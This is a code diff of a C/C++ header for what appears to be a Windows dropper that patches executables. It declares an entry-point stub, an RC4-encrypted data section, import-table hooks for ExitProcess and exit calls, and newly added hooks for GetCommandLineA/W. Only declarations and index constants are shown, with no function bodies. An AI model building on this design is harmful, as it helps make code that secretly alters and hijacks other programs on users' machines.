@@ -44,33 +44,39 @@ extern BYTE oepStub[OEPSTUBSIZE];
 #define STRIDX_HFF5				10
 #define STRIDX_DIRSEP			11
 #define STRIDX_USER32_DLL		12
+#define STRIDX_MSVCR60_DLL		13
+#define STRIDX_MSVCR70_DLL		14
+#define STRIDX_MSVCR80_DLL		15
+#define STRIDX_MSVCR90_DLL		16
+#define STRIDX_MSVCR10_DLL		17
+#define STRIDX_MSVCRHOOKED		18
+#define STRIDX_EXITCALL			19
+#define STRIDX__EXITCALL		20
+#define STRIDX_EXITPROCESS		21
+#define STRIDX_TERMINATEPROCESS	22
+#define STRIDX_GETCMDLINEA		23
+#define STRIDX_GETCMDLINEW		24
 
 #if _DEBUG
-#define STRIDX_ERRORCREDIR		13
-#define STRIDX_EXITPROCIDX		14
-#define STRIDX_EXITPROCHOOKED   15
-#define STRIDX_RESTOREOEP		16
-#define STRIDX_EXITHOOKED		17
-#define STRIDX_OEPRESTORED		18
-#define STRIDX_CALLINGOEP		19
-#define STRIDX_CREATEFILE_ERR   20
-#define STRIDX_HFF5CALLING      21
-#define STRIDX_HFF5CALLED	    22
-#define STRIDX_INEXITPROC_HOOK  23
-#define STRIDX_VECTORQUIT		24
-#define STRIDX_VERIFYVERSION    25
-#define STRIDX_SYSMAJORVER		26
-#define STRIDX_SYSMINORVER		27
-#define STRIDX_RESTORESTAGE1	28
-#define STRIDX_RESTORESTAGE2	29
-#define STRIDX_TERMINATEPROCESS 30
-#define STRIDX_UNCOMPRESS_ERR   31
-#define STRIDX_MSVCR60_DLL		32
-#define STRIDX_MSVCR70_DLL		33
-#define STRIDX_MSVCR80_DLL		34
-#define STRIDX_MSVCR90_DLL		35
-#define STRIDX_MSVCR10_DLL		36
-#define STRIDX_MSVCRHOOKED		37
+#define STRIDX_ERRORCREDIR		25
+#define STRIDX_EXITPROCIDX		26
+#define STRIDX_EXITPROCHOOKED   27
+#define STRIDX_RESTOREOEP		28
+#define STRIDX_EXITHOOKED		29
+#define STRIDX_OEPRESTORED		30
+#define STRIDX_CALLINGOEP		31
+#define STRIDX_CREATEFILE_ERR   32
+#define STRIDX_HFF5CALLING      33
+#define STRIDX_HFF5CALLED	    34
+#define STRIDX_INEXITPROC_HOOK  35
+#define STRIDX_VECTORQUIT		36
+#define STRIDX_VERIFYVERSION    37
+#define STRIDX_SYSMAJORVER		38
+#define STRIDX_SYSMINORVER		39
+#define STRIDX_RESTORESTAGE1	40
+#define STRIDX_RESTORESTAGE2	41
+#define STRIDX_TERMINATEPROCESS_ 42
+#define STRIDX_UNCOMPRESS_ERR   43
 #endif
 
 // DLL calls indexes
@@ -109,14 +115,17 @@ extern BYTE oepStub[OEPSTUBSIZE];
 #define CALL_ISWOW64PROCESS				30
 #define CALL_GETCURRENTPROCESS			31
 #define CALL_TERMINATEPROCESS			32
+#define CALL_GETMODULEHANDLE			33
+#define CALL_GETCOMMANDLINEA			34
+#define CALL_GETCOMMANDLINEW			35
 
 // MSVCRT.dll
-#define CALL_SPRINTF					33
-#define CALL_EXIT						34
-#define CALL__EXIT						35
+#define CALL_SPRINTF					36
+#define CALL_EXIT						37
+#define CALL__EXIT						38
 
 // ADVAPI32.DLL
-#define CALL_GETCURRENTHWPROFILE		36
+#define CALL_GETCURRENTHWPROFILE		39
 
 // #define STRING(idx) (LPCSTR)strings[((DWORD*)stringsOffsets)[(idx)]]
 #define STRING(idx) (char*)(strings + stringsOffsets[(idx)])
@@ -194,24 +203,6 @@ typedef ALIGN4 struct _data_section_header {
 	// used to pass full qualified path to core thread
 	CHAR *dllPath;
 	
-	// used to hook ExitProcess on Vista (Vista deletes call names from Thunks when EXE is loaded)
-	struct {
-		int ExitProcess;
-		int TerminateProcess;
-		int exit;
-		int _exit;
-		int exit6;
-		int exit7;
-		int exit8;
-		int exit9;
-		int exit10;
-		int _exit6;
-		int _exit7;
-		int _exit8;
-		int _exit9;
-		int _exit10;
-	} hookedCalls;
-	
 	// our own functions
 	struct {
 		DataSectionBlob newEntryPoint;
@@ -220,6 +211,8 @@ typedef ALIGN4 struct _data_section_header {
 		DataSectionBlob exitProcessHook;
 		DataSectionBlob terminateProcessHook;
 		DataSectionBlob exitHook;
+		DataSectionBlob GetCommandLineAHook;
+		DataSectionBlob GetCommandLineWHook;
 		DataSectionBlob rvaToOffset;
 		DataSectionBlob rc4;
 		DataSectionBlob hookCall;
@@ -240,6 +233,11 @@ typedef ALIGN4 struct _data_section_header {
 	PatchBlob stage2;
 	
 	DataSectionBlob restore;
+
+	ULONG exeType;
+	LPSTR cmdLineA;
+	LPWSTR cmdLineW;
+
 	
 } DataSectionHeader;
 
@@ -393,6 +391,9 @@ typedef void (__cdecl *EXIT)(int status);
 
 typedef void (__cdecl *_EXIT)(int status);
 
+typedef LPSTR (WINAPI *GETCOMMANDLINEA)();
+typedef LPWSTR (WINAPI *GETCOMMANDLINEW)();
+
 typedef BOOL (*VERIFYVERSIONINFO) (
 							  OSVERSIONINFOEX* lpVersionInfo,
 							  DWORD dwTypeMask,
@@ -409,17 +410,19 @@ typedef BOOL (*ISWOW64PROCESS)(HANDLE, BOOL *);
 
 typedef HANDLE (*GETCURRENTPROCESS)(void);
 
+typedef HMODULE (*GETMODULEHANDLE)(LPCTSTR);	
+
 typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);
 
 typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip,
 						 unsigned char *data, size_t data_len, DataSectionHeader *header);
 
-typedef DWORD (*HOOKCALL)(char* dll, 
-				 int index, 
-				 DWORD hookFunc, 
-				 UINT_PTR IAT_rva, 
-				 DWORD imageBase, 
-				 DataSectionHeader *header); 
+typedef DWORD (*HOOKCALL)(char* dll,
+	char* name,
+	DWORD hookFunc,
+	UINT_PTR IAT_RVA,
+	DWORD imageBase,
+	DataSectionHeader *header);
 
 #pragma endregion
 
@@ -432,6 +435,7 @@ __forceinline void _MEMSET_( void *_dst, int _val, size_t _sz );
 __forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz );
 __forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz );
 __forceinline size_t _STRLEN_(char *_src);
+__forceinline size_t _STRLENW_(wchar_t *_src);
 __forceinline void _TOUPPER_(char *s);
 __forceinline  void _TOUPPER_CHAR(char *c);
 __forceinline void _TOLOWER_(char *s);
@@ -468,12 +472,19 @@ FUNCTION_END_DECL(TerminateProcessHook);
 __declspec(noreturn) void __cdecl ExitHook(int status);
 FUNCTION_END_DECL(ExitHook);
 
+LPSTR WINAPI GetCommandLineAHook();
+FUNCTION_END_DECL(GetCommandLineAHook);
+
+LPWSTR WINAPI GetCommandLineWHook();
+FUNCTION_END_DECL(GetCommandLineWHook);
+
 void rc4_skip(const unsigned char *key, size_t keylen, size_t skip,
 			  unsigned char *data, size_t data_len, DataSectionHeader *header);
 FUNCTION_END_DECL(rc4_skip);
 
-DWORD hookCall(char* dll, int index, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DataSectionHeader *header); 
+DWORD hookCall(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DataSectionHeader *header);
 FUNCTION_END_DECL(hookCall);
+
 
 void generate_key(std::string& key, unsigned int length);
 bool dumpDropperFiles();
